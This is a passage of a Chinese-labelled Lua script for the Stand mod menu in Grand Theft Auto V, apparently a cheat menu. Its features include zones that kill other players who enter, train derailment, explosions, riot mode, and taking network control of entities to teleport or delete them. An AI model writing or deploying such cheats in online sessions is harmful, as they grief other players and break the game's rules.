    menu.set_list_action_options(load_vehicle_action, all_vehicles)
    menu.set_list_action_options(load_favorite_vehicle_action, favorite_vehicles)
end

get_all_vehicles_in_dir()
get_all_maps_in_dir()

util.create_thread(function()
    while true do
        get_all_vehicles_in_dir()
        get_all_maps_in_dir()
        util.yield(5000)
    end
end)

local protected_areas_root = menu.list(lobbyFeats, "保护区", {}, "只对某些人开放的区域，否则这些人会被杀。" )

local active_protected_areas_root = menu.list(protected_areas_root, "活动区域", {},  "当前被定义为'受保护'的区域")


menu.toggle(protected_areas_root, "执法区域", {}, "这需要为您的区域真正杀死人。", function(on)
    mod_uses("player", if on then 1 else -1)
    protected_areas_on = on
end)


menu.slider(protected_areas_root, "区域范围", {}, "要创建的保护区的范围。 这一旦完成就无法更改。", 10, 1000, 100, 10, function(s)
    protected_area_radius = s
end)

menu.toggle(protected_areas_root, "总是允许朋友", {}, "无论如何都允许朋友。", function(on)
    protected_area_allow_friends = on
end, true)


menu.toggle(protected_areas_root, "只杀死武装玩家", {}, "只瞄准带武器的玩家。", function(on)
    protected_area_kill_armed = on
end)

menu.action(protected_areas_root, "定义保护区", {"definepa"}, "在您身上定义一个保护区。", function(click_type)
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
    blip = HUD.ADD_BLIP_FOR_RADIUS(c.x, c.y, c.z, protected_area_radius)
    HUD.SET_BLIP_COLOUR(blip, 61)
    HUD.SET_BLIP_ALPHA(blip, 128)
    local this_area = {}
    this_area.blip = blip
    this_area.x = c.x
    this_area.y = c.y
    this_area.z = c.z
    this_area.radius = protected_area_radius
    pa_next = #protected_areas + 1
    protected_areas[pa_next] = this_area
    local new_protected_area = menu.list(active_protected_areas_root, tostring(pa_next), {"protectedarea" .. pa_next}, "查看和修改此区域")
    menu.action(new_protected_area, "删除", {"deletepa" .. tostring(pa_next)}, "删除该区域。", function(click_type)
        util.remove_blip(blip)
        protected_areas[pa_next] = nil
        menu.delete(new_protected_area)
        notification("保护区已删除", colors.blue)
    end)
end)

local colouroverlyasd = menu.list(lobbyFeats, '颜色覆盖', {}, '')

local colourOverlay = new.colour( 0, 0, 10, 0.1 )

menu.toggle_loop(colouroverlyasd, '颜色覆盖', {'JScolourOverlay'}, '在游戏上应用颜色过滤器.', function()
    directx.draw_rect(0, 0, 1, 1, colourOverlay)
end)

menu.rainbow(menu.colour(colouroverlyasd   , '设置覆盖颜色', {'JSoverlayColour'}, '', colourOverlay, true, function(colour)
    colourOverlay = colour
end))

    local trainsasd = menu.list(lobbyFeats, '火车', {'JStrains'}, '')

    local trainsStopped = false
    local function stopTrain(train)
        util.create_thread(function()
            while trainsStopped do
                VEHICLE.SET_TRAIN_SPEED(train, -0.05)
                util.yield()
            end
            VEHICLE.SET_RENDER_TRAIN_AS_DERAILED(train, false)
        end)
    end

    menu.toggle(trainsasd, '火车脱轨', {'JSderail'}, '使所有火车脱轨并停止.', function(toggle)
        local vehPointers = entities.get_all_vehicles_as_pointers()
        trainsStopped = toggle
        for i = 1, #vehPointers do
            local vehHash = entities.get_model_hash(vehPointers[i])
            if VEHICLE.GET_VEHICLE_CLASS_FROM_NAME(vehHash) == 21 then
                local trainHandle = entities.pointer_to_handle(vehPointers[i])
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(trainHandle)
                VEHICLE.SET_RENDER_TRAIN_AS_DERAILED(trainHandle, true)
                stopTrain(trainHandle)
            end
        end
    end)

    menu.action(trainsasd, '删除火车', {'JSdeleteTrain'}, '只是因为每个脚本都有火车选项,我必须也有一个反火车选项.', function()
        VEHICLE.DELETE_ALL_TRAINS()
    end)

    local markedTrains = {}
    local markedTrainBlips = {}
    menu.toggle_loop(trainsasd, '标记附近的火车', {'JSnoMapNotifications'}, '用紫色光点标记附近的火车.', function()
        local vehPointers = entities.get_all_vehicles_as_pointers()
        removeValues(vehPointers, markedTrains)

        for i = 1, #vehPointers do
            local vehHash = entities.get_model_hash(vehPointers[i])
            if VEHICLE.GET_VEHICLE_CLASS_FROM_NAME(vehHash) == 21 then
                if notifications then
                    util.toast('Marked train')
                end
                table.insert(markedTrains, vehPointers[i])
                local blip = HUD.ADD_BLIP_FOR_ENTITY(entities.pointer_to_handle(vehPointers[i]))
                HUD.SET_BLIP_COLOUR(blip, 58)
                table.insert(markedTrainBlips, blip)
            end
        end
        util.yield(100)
    end, function()
        for i = #markedTrainBlips, 1, -1 do
            util.remove_blip(markedTrainBlips[i])
            markedTrainBlips[i] = nil
            markedTrains[i] = nil
        end
    end)

menu.action(trainsasd, "寻找列车",{""}, "", function()
    for _, veh in pairs(entities.get_all_vehicles_as_pointers()) do 
        if entities.get_model_hash(veh) == util.joaat("freight") then
            local c = entities.get_position(veh)
            ENTITY.SET_ENTITY_COORDS(players.user_ped(), c.x, c.y, c.z)
            return 
        end
    end
    util.toast("找不到火车")
end)

    local pedsasd = menu.list(lobbyFeats, 'NPC', {'JSpeds'}, '')

    
    for i = 1, #pedToggleLoops do
        menu.toggle_loop(pedsasd, pedToggleLoops[i].name, {pedToggleLoops[i].command}, pedToggleLoops[i].description, function()
            local pedHandles = entities.get_all_peds_as_handles()
            for j = 1, #pedHandles do
                pedToggleLoops[i].action(pedHandles[j])
            end
            util.yield(10)
        end, function()
            if pedToggleLoops[i].onStop then pedToggleLoops[i].onStop() end
        end)
    end

    menu.toggle_loop(pedsasd, '杀死车主', {'JSkillJackedPeds'}, '抢车的时候自动杀死驾驶载具的NPC', function(toggle)
        if not PED.IS_PED_JACKING(players.user_ped()) then return end
        local jackedPed = PED.GET_JACK_TARGET(players.user_ped())
        util.yield(100)
        ENTITY.SET_ENTITY_HEALTH(jackedPed, 0, 0)
    end)

    menu.toggle(pedsasd, '暴动模式', {'JSriot'}, '使附近的NPC充满敌意.', function(toggle)
        MISC.SET_RIOT_MODE_ENABLED(toggle)
    end)


local fireworks_root = menu.list(lobbyFeats, "烟花", {}, "")

menu.action(fireworks_root, "放烟花盒", {"placefireworks"}, "模仿已删除的线上功能-放置烟花盒", function(click_type)
    placefirework()
end)

menu.action(fireworks_root, "放烟花", {"kaboom"}, "点燃所有放好的烟花。", function(click_type)
    fireworkshow()
end)

    local firw = {speed = 1000}
    menu.toggle_loop(fireworks_root, '看烟花', {''}, '', function ()
          local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
          local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
          local weap = util.joaat('weapon_firework')
          WEAPON.REQUEST_WEAPON_ASSET(weap)
          for y = 0, 1 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(0, 0), 200, 0, weap, 0, false, false, firw.speed)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(0, 0), 200, 0, weap, 0, false, false, firw.speed)
            FIRE.ADD_EXPLOSION(tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(0, 100), 38, 1, false, false, 0, false)
            FIRE.ADD_EXPLOSION(tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(0, 100), 38, 1, false, false, 0, false) 
        end


          if not PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID) then
              util.stop_thread()
          end
      end)

menu.toggle_loop(fireworks_root, "循环放烟花", {}, "", function()
    local coords = players.get_position(players.user())
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords.x, coords.y, coords.z+1, coords.x, coords.y, coords.z+10, 1, true, 2138347493, playerPed, true, false, 50)
    util.yield(100)
end)

meteors = false
menu.toggle(lobbyFeats, "陨石掉落", {""}, "", function(on)
    if on then
        meteors = true
        start_meteor_shower()
    else
        meteors = false
    end
end, false)

menu.toggle_loop(lobbyFeats, "投弹",{"bowlingshower"}, "下炸弹雨", function()
    local hash = util.joaat("imp_prop_bomb_ball")
    request_model_load(hash)
    if active_bowling_balls <= 15 then 
        local c = WIRI_ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), math.random(-200, 200), math.random(-200, 200), math.random(100, 300))
        local ball = entities.create_object(hash, c)
        ENTITY.FREEZE_ENTITY_POSITION(ball, false)
        ENTITY.SET_ENTITY_DYNAMIC(ball, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(ball, 1, math.random(-300, 300), math.random(-300, 300), -300, 0, 0, 0, 0, true, false, true, true, true)
        bomb_shower_tick_handler(ball)
    end
    util.yield(500)
end)

menu.action(lobbyFeats, "你的勇士",{""}, "生成一个不断击杀附近NPC的保镖",function()
    local terror_model = util.joaat("s_m_y_xmech_02")
    request_model_load(terror_model)
    local terrorist = entities.create_ped(28, terror_model, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 1.0, 0.0), math.random(270))
    WEAPON.GIVE_WEAPON_TO_PED(terrorist, 171789620, 1000, false, true)
    PED.SET_PED_COMBAT_ABILITY(terrorist, 2)
    PED.SET_PED_AS_ENEMY(terrorist, true)
    PED.SET_PED_COMBAT_ATTRIBUTES(terrorist,13, true)
    while true do
        if PED.IS_PED_FATALLY_INJURED(terrorist) or not ENTITY.DOES_ENTITY_EXIST(terrorist) then 
            break 
        end
        local nearest = get_closest_ped_to_ped(ENTITY.GET_ENTITY_COORDS(terrorist), terrorist)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(terrorist)
        TASK.TASK_COMBAT_PED(terrorist, nearest[1])
        util.yield(5000)
    end
end)

    menu.toggle_loop(lobbyFeats, "雨", {""}, "", function()
        local player_pos = players.get_position(players.user())
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "water_boat_exit", player_pos.x, player_pos.y, player_pos.z+5, 0, 0, 0, 2.5, false, false, false)
    end)

rain_vehicles = false
menu.toggle(lobbyFeats, "载具雨",{"rain_vehicles"}, "天上掉下一堆载具", function(on)
    rain_vehicles = on
    mod_uses("vehicle", if on then 1 else -1)
end)

rain_peds = false
menu.toggle(lobbyFeats, "掉落NPC",{"rain_peds"}, "天上掉下一堆NPC", function(on)
    rain_peds = on
    mod_uses("ped", if on then 1 else -1)
end)

bigasscircle = util.joaat("ar_prop_ar_neon_gate4x_04a")
qiuqiu = menu.list(lobbyFeats, '球体生成', {}, '在银行楼顶生成一个巨大的圆球')

menu.action(qiuqiu, "生成", {}, "", function()
    STREAMING.REQUEST_MODEL(bigasscircle)
    while not STREAMING.HAS_MODEL_LOADED(bigasscircle) do
        STREAMING.REQUEST_MODEL(bigasscircle)
        util.yield()
    end
    c1 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751)) --why tables when ctrl + c, ctrl + v
    c2 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c3 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c4 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c5 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c6 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c7 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c8 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c9 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c10 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c11 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c12 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c13 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c14 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c15 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c16 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c17 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c18 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c19 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    ENTITY.FREEZE_ENTITY_POSITION(c1, true)
    ENTITY.FREEZE_ENTITY_POSITION(c2, true)
    ENTITY.FREEZE_ENTITY_POSITION(c3, true)
    ENTITY.FREEZE_ENTITY_POSITION(c4, true)
    ENTITY.FREEZE_ENTITY_POSITION(c5, true)
    ENTITY.FREEZE_ENTITY_POSITION(c6, true)
    ENTITY.FREEZE_ENTITY_POSITION(c7, true)
    ENTITY.FREEZE_ENTITY_POSITION(c8, true)
    ENTITY.FREEZE_ENTITY_POSITION(c9, true)
    ENTITY.FREEZE_ENTITY_POSITION(c10, true)
    ENTITY.FREEZE_ENTITY_POSITION(c11, true)
    ENTITY.FREEZE_ENTITY_POSITION(c12, true)
    ENTITY.FREEZE_ENTITY_POSITION(c13, true)
    ENTITY.FREEZE_ENTITY_POSITION(c14, true)
    ENTITY.FREEZE_ENTITY_POSITION(c15, true)
    ENTITY.FREEZE_ENTITY_POSITION(c16, true)
    ENTITY.FREEZE_ENTITY_POSITION(c17, true)
    ENTITY.FREEZE_ENTITY_POSITION(c18, true)
    ENTITY.FREEZE_ENTITY_POSITION(c19, true)
    ENTITY.SET_ENTITY_ROTATION(c2, 0.0, 0.0, 10.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c3, 0.0, 0.0, 20.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c4, 0.0, 0.0, 30.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c5, 0.0, 0.0, 40.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c6, 0.0, 0.0, 50.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c7, 0.0, 0.0, 60.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c8, 0.0, 0.0, 70.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c9, 0.0, 0.0, 80.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c10, 0.0, 0.0, 90.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c11, 0.0, 0.0, 100.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c12, 0.0, 0.0, 110.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c13, 0.0, 0.0, 120.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c14, 0.0, 0.0, 130.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c15, 0.0, 0.0, 140.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c16, 0.0, 0.0, 150.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c18, 0.0, 0.0, 160.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c19, 0.0, 0.0, 170.0, 1, true)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), -75.14637, -818.67236, 326.1751)
end)

menu.action(qiuqiu, "删除", {}, "", function()
    entities.delete_by_handle(c1)
    entities.delete_by_handle(c2)
    entities.delete_by_handle(c3)
    entities.delete_by_handle(c4)
    entities.delete_by_handle(c5)
    entities.delete_by_handle(c6)
    entities.delete_by_handle(c7)
    entities.delete_by_handle(c8)
    entities.delete_by_handle(c9)
    entities.delete_by_handle(c10)
    entities.delete_by_handle(c11)
    entities.delete_by_handle(c12)
    entities.delete_by_handle(c13)
    entities.delete_by_handle(c14)
    entities.delete_by_handle(c15)
    entities.delete_by_handle(c16)
    entities.delete_by_handle(c17)
    entities.delete_by_handle(c18)
    entities.delete_by_handle(c19)
end)

island_block = 0
menu.action(lobbyFeats, "天空岛", {""}, "", function(on_click)
    local c = {}
    c.x = 0
    c.y = 0
    c.z = 500
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c.x, c.y, c.z+5)
    if island_block == 0 or not ENTITY.DOES_ENTITY_EXIST(island_block) then
        request_model_load(1054678467)
        island_block = entities.create_object(1054678467, c)
    end
end)

menu.toggle_loop(lobbyFeats, "外星人入侵", {}, "", function(toggle)
    ufffo()
end)

menu.toggle(lobbyFeats, "安全的战局", {}, "全战局幽灵", function(on)
	if on then
		for pid = 0,30 do
			if players.exists(pid) then
				NETWORK._SET_RELATIONSHIP_TO_PLAYER(pid,true)
			end
		end
	else
		for pid = 0,30 do
			if players.exists(pid) then
				NETWORK._SET_RELATIONSHIP_TO_PLAYER(pid,false)
			end
		end
	end 
end)

menu.toggle_loop(lobbyFeats, "跳跳车", {}, '', function(toggle)
    carjump()
end)

    menu.toggle(lobbyFeats, '同步时间', {'JSirlTime'}, '使游戏时间与您的现实时间相匹配. 请禁用Stand的时间 "平滑过渡".', function(toggle)
        iri_time(toggle)
    end)

    menu.toggle_loop(lobbyFeats, '禁用小键盘', {'JSdisableNumpad'}, '禁用小键盘,因此您在操作Stand时不会旋转您的飞机/潜艇', function()
        disableNumpad()
    end)

    menu.slider(lobbyFeats, '地图缩放级别', {'JSmapZoom'}, '', 1, 100, mapZoom, 1, function(value)
        Zoom_map(value)
    end)

    menu.toggle(lobbyFeats, '启用脚印', {'JSfootSteps'}, '在所有表面上留下脚印.', function(toggle)
        GRAPHICS._SET_FORCE_PED_FOOTSTEPS_TRACKS(toggle)
    end)

    menu.toggle(lobbyFeats, '启用车辆轨迹', {'JSvehicleTrails'}, '在所有表面上留下车辆的轨迹.', function(toggle)
        GRAPHICS._SET_FORCE_VEHICLE_TRAILS(toggle)
    end)

    menu.toggle_loop(lobbyFeats, '禁用所有地图通知', {'JSnoMapNotifications'}, '自动删除那些不断发送的通知', function()
        HUD.THEFEED_HIDE_THIS_FRAME()
    end)

Heist_Control_Load = menu.action(Heist_Control, "加载任务选项", {""}, "", function()

notification("正在加载任务脚本,请稍等",colors.blue)
util.yield(2000)
    require "lib.GTlib.hc"
    menu.delete(Heist_Control_Load)
end)

Musiness_Banager_Load = menu.action(Musiness_Banager, "加载自动产业", {""}, "", function()

notification("正在加载自动产业,请稍等",colors.blue)
util.yield(2000)
    require "lib.GTlib.mb"
    menu.delete(Musiness_Banager_Load)
end)

Constructor_Lua_Load = menu.action(Constructor_Lua, "加载模型选项", {""}, "", function()

notification("正在加载模型脚本,请稍等",colors.blue)
util.yield(2000)
    require "lib.GTlib.Constructor.Constructor"
    menu.delete(Constructor_Lua_Load)
end)

menu.action(toolFeats, "平滑瞬移", {"stp"}, "在相机平稳的情况下将您传送到您的航点。", function ()
    SmoothTeleportToCord(Get_Waypoint_Pos2(), FRAME_STP)
end)

menu.toggle(toolFeats, "平滑传送帧", {"stpv2"}, "使您或您的车辆与相机一起传送，以实现“更顺畅”的传送。", function(toggle)
    FRAME_STP = toggle
end)

menu.action(toolFeats, "重置相机", {"resetstp"}, "将脚本 cam 渲染为 false，同时销毁当前 cam。 因为如果你传送到海里，然后相机就死了。", function ()
    local renderingCam = CAM.GET_RENDERING_CAM()
    CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
    CAM.DESTROY_CAM(renderingCam, true)
end)

local stpsettings = menu.list(toolFeats, "平滑TP设置", {}, "")

menu.slider(stpsettings, "速度修改器（x）/10", {"stpspeed"}, "用于平滑 tp 的速度修改器，乘法。 这将除以 10，因为滑块不能采用非整数", 1, 100, 10, 1, function(value)
    local multiply = value / 10
    if SE_Notifications then
        util.toast("SmoothTP 速度倍增器设置为 " .. tostring(multiply) .. "!")
    end
    STP_SPEED_MODIFIER = 0.02 --set it again so it doesnt multiply over and over. This took too long to figure out....
    STP_SPEED_MODIFIER = STP_SPEED_MODIFIER * multiply
end)

menu.slider(stpsettings, "凸轮过渡的高度（米）", {"stpheight"}, "在进行过渡时设置相机的高度。", 0, 10000, 300, 10, function (value)
    local height = value
    if SE_Notifications then
        util.toast("SmoothTP 高度设置为 " .. tostring(height) .. "!")
    end
    STP_COORD_HEIGHT = height
end)

menu.toggle_loop(toolFeats, "绘制位置", {"drawpos"},  "", function ()
    local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    directx.draw_text(0.0, 0.0, "x: " .. pos.x .. " // y: " .. pos.y .. " // z: " .. pos.z, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
end)

menu.toggle_loop(toolFeats, "绘制旋转", {"drawrot"}, "", function ()
    local rot = ENTITY.GET_ENTITY_ROTATION(GetLocalPed(), 2)
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    directx.draw_text(0.5, 0.03, "pitch: " .. rot.x .. " // roll: " .. rot.y .. " // yaw: " .. rot.z, ALIGN_CENTRE, DR_TXT_SCALE, cc, false)
    local facingtowards
    if ((rot.z >= 135) or (rot.z < -135)) then facingtowards = "-Y"
    elseif ((rot.z < 135) and (rot.z >= 45)) then facingtowards = "-X"
    elseif ((rot.z >= -135) and (rot.z < -45)) then facingtowards = "+X"
    elseif ((rot.z >= -45) or (rot.z < 45)) then facingtowards = "+Y" end
    directx.draw_text(0.5, 0.07, "Facing towards " .. facingtowards, ALIGN_CENTRE, DR_TXT_SCALE, cc, false)
end)

menu.toggle_loop(toolFeats, "绘制实体池", {"drawentpool"}, "", function ()
    local cc = {r = 1.0, g = 1.0, b = 20.0, a = 0.5}
    if EP_drawveh then
        local vehpool = entities.get_all_vehicles_as_pointers()
        directx.draw_text(EPS_vehx, EPS_vehy, "载具：" .. #vehpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
    if EP_drawped then
        local pedpool = entities.get_all_peds_as_pointers()
        directx.draw_text(EPS_pedx, EPS_pedy, "PED：" .. #pedpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
    if EP_drawobj then
        local objpool = entities.get_all_objects_as_pointers()
        directx.draw_text(EPS_objx, EPS_objy, "实体：" .. #objpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
    if EP_drawpick then
        local pickpool = entities.get_all_pickups_as_pointers()
        directx.draw_text(EPS_pickx, EPS_picky, "拾取物：" .. #pickpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
end)

local ePS = menu.list(toolFeats,"实体池设置", {}, "")
menu.toggle(ePS, "绘制车辆", {}, "", function (toggle)
    EP_drawveh = toggle
end, true)
menu.slider(ePS, "车辆文字摆放X", {"epvehposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_vehx = value / 100
end) 
menu.slider(ePS, "车辆文字摆放Y", {"epvehposy"}, "/100", 0, 100, 3, 1, function (value)
    EPS_vehy = value / 100
end)
menu.toggle(ePS, "绘制行人", {}, "", function (toggle)
    EP_drawped = toggle
end, true)
menu.slider(ePS, "Ped 文本放置 X", {"eppedposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_pedx = value / 100
end)
menu.slider(ePS, "Ped 文本放置 Y", {"eppedposy"}, "/100", 0, 100, 5, 1, function (value)
    EPS_pedy = value / 100
end)
menu.toggle(ePS, "绘制物体", {}, "", function (toggle)
    EP_drawobj = toggle
end, true)
menu.slider(ePS, "物体文字放置X", {"epobjposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_objx = value / 100
end)
menu.slider(ePS, "物体文字位置Y", {"epobjposy"}, "/100", 0, 100, 7, 1, function (value)
    EPS_objy = value / 100
end)
menu.toggle(ePS, "绘制拾音器", {}, "", function (toggle)
    EP_drawpick = toggle
end, true)
menu.slider(ePS, "拾取文本放置X拾取文本放置Y绘制拾取", {"epickjposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_pickx = value / 100
end)
menu.slider(ePS, "拾取文本位置Y", {"epickjposy"}, "/100", 0, 100, 9, 1, function (value)
    EPS_picky = value / 100
end)

menu.slider(toolFeats, "文本大小（/10）", {"drscale"}, "将文本的比例设置为您指定的值，除以 10。这是因为它只采用整数值。", 1, 50, 5, 1, function (value)
    DR_TXT_SCALE = value / 10
end)

menu.divider(toolFeats, "设置")
menu.slider(toolFeats, "文本比例 (/10)", {"drscale"}, "将文本的比例设定为您指定的值, 除以10. 这是因为它只接受整数值.", 1, 50, 5, 1, function (value)
    DR_TXT_SCALE = value / 10
end)

menu.divider(toolFeats, "其他")

----
createPed = PED.CREATE_PED
getEntityCoords = ENTITY.GET_ENTITY_COORDS
getPlayerPed = PLAYER.GET_PLAYER_PED
requestModel = STREAMING.REQUEST_MODEL
hasModelLoaded = STREAMING.HAS_MODEL_LOADED
noNeedModel = STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED
setPedCombatAttr = PED.SET_PED_COMBAT_ATTRIBUTES
giveWeaponToPed = WEAPON.GIVE_WEAPON_TO_PED

WhiteText = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
YOINK_PEDS = false
YOINK_VEHICLES = false
YOINK_OBJECTS = false
YOINK_PICKUPS = false

YOINK_RANGE = 500

Yoinkshit = false

menu.toggle(toolFeats, "控制器", {}, "", function (yoink)
    if yoink then
        Yoinkshit = true
        util.create_thread(function()
            while Yoinkshit do
                local yoinksq = YOINK_RANGE^2
                local localCoord = getEntityCoords(getPlayerPed(players.user()))
                local BigTable = {}
                if YOINK_PEDS then
                    local pedTable = entities.get_all_peds_as_pointers()
                    for i = 1, #pedTable do
                        local coord = entities.get_position(pedTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        local handle = entities.pointer_to_handle(pedTable[i])
                        if not PED.IS_PED_A_PLAYER(handle) then
                            if distsq <= yoinksq then
                                BigTable[#BigTable+1] = handle
                            end
                        end
                    end
                end
                wait()
                if YOINK_VEHICLES then
                    local vehTable = entities.get_all_vehicles_as_pointers()
                    for i = 1, #vehTable do
                        local coord = entities.get_position(vehTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        if distsq <= yoinksq then
                            BigTable[#BigTable+1] = entities.pointer_to_handle(vehTable[i])
                        end
                    end
                end
                wait()
                if YOINK_OBJECTS then
                    local objTable = entities.get_all_objects_as_pointers()
                    for i = 1, #objTable do
                        local coord = entities.get_position(objTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        if distsq <= yoinksq then
                            BigTable[#BigTable+1] = entities.pointer_to_handle(objTable[i])
                        end
                    end
                end
                if YOINK_PICKUPS then
                    local pickTable = entities.get_all_pickups_as_pointers()
                    for i = 1, #pickTable do
                        local coord = entities.get_position(pickTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        if distsq <= yoinksq then
                            BigTable[#BigTable+1] = entities.pointer_to_handle(pickTable[i])
                        end
                    end
                end
                for i = 1, #BigTable do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(BigTable[i])
                    wait()
                end
                util.toast("请求控制所有")
                ----
                wait()
            end
            util.stop_thread()
        end)
    else
        Yoinkshit = false
    end
end)
local yoinkSettings = menu.list(toolFeats, "控制设置", {}, "")
menu.slider(yoinkSettings, "管理范围", {"yoinkrange"}, "", 1, 5000, 500, 10, function (value)
    YOINK_RANGE = value
end)
menu.toggle(yoinkSettings, "PED", {}, "", function (peds)
    YOINK_PEDS = peds
end)
menu.toggle(yoinkSettings, "载具", {}, "", function (vehs)
    YOINK_VEHICLES = vehs
end)
menu.toggle(yoinkSettings, "物体", {}, "", function (objs)
    YOINK_OBJECTS = objs
end)
menu.toggle(yoinkSettings, "收集品", {}, "", function (pick)
    YOINK_PICKUPS = pick
end)


local tpyoink = menu.list(toolFeats, "传送所有到我", {}, "")

menu.action(tpyoink, "传送所有PED", {}, "", function ()
    TpAllPeds(players.user())
end)
menu.action(tpyoink, "传送所有载具", {}, "WARNING: DANGEROUS SHIT!", function()
    TpAllVehs(players.user())
end)
menu.action(tpyoink, "传送所有物体", {}, "WARNING: BIG CHANCE YOU MIGHT CRASH!", function ()
    TpAllObjects(players.user())
end)
menu.action(tpyoink, "传送所有收集品", {}, "", function ()
    TpAllPickups(players.user())
end)


local clearAreaTools = menu.list(toolFeats, "清理区域", {}, "")
CLEAR_AREA_RANGE = 100
local function clearAreaOfEntities(tbl, range)
    local rangesq = range*range
    local pc = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    for _, v in pairs(tbl) do
        local cc = entities.get_position(v)
        if (SYSTEM.VDIST2(pc.x, pc.y, pc.z, cc.x, cc.y, cc.z) <= rangesq) then
            local h = entities.pointer_to_handle(v)
            if (ENTITY.IS_ENTITY_A_PED(h) and not PED.IS_PED_A_PLAYER(h)) or (not ENTITY.IS_ENTITY_A_PED(h)) then
                --todo: ped check if ped is a player []done
                --todo: dont delete vehicle that you are driving/riding
                for i = 0, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(h) end
                entities.delete_by_handle(h)
            end
        end
    end
end
menu.action(clearAreaTools, "清理PED", {"clearpeds"}, "", function ()
    local pp = entities.get_all_peds_as_pointers()
    clearAreaOfEntities(pp, CLEAR_AREA_RANGE)
end)
menu.action(clearAreaTools, "清理载具", {"clearvehs"}, "", function ()
    local vp = entities.get_all_vehicles_as_pointers()
    clearAreaOfEntities(vp, CLEAR_AREA_RANGE)
end)
menu.action(clearAreaTools, "清理物体", {"clearobjs"}, "", function ()
    local op = entities.get_all_objects_as_pointers()
